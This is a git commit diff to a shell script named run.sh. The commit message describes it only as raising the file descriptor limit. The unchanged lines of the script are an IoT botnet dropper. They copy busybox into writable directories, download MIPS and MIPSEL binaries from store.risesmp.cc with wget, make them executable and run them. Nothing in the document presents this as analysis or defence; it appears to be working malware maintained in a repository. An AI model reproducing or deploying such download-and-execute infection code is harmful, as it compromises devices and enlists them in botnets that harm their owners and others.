48d9e57fbfbec6d9454e85b7569b8355901beb5f
urBenm4 <138570858+urBenm4@users.noreply.github.com>
2026-06-13 09:35:11 +0400

    Increase file descriptor limit in run.sh

--- wow/old/run.sh
+++ wow/old/run.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-ulimit -n 1024 2>/dev/null || true
+ulimit -n 65535 2>/dev/null || true
 cp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /var/run/ || cp /bin/busybox /run/ || cp /bin/busybox /dev/shm/ || cp /bin/busybox /mnt/ || cp /bin/busybox /root/ || cp /bin/busybox /opt/ || cp /bin/busybox /var/ || cp /bin/busybox /home/ || true
 cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mips; chmod 777 ntb.mips; ./ntb.mips universal
 cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mipsel; chmod 777 ntb.mipsel; ./ntb.mipsel universal
